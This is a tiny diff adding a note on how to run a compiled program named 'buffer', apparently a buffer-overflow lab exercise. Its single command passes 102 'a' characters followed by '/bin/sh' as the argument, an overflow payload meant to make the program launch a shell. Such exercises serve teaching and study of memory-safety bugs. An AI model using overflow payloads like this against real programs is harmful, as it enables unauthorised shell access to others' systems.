@@ -1,0 +1,4 @@
+Run compiled program with:
+
+./buffer "$(perl -e 'print "a"x102'; perl -e 'print "/bin/sh"')"
+
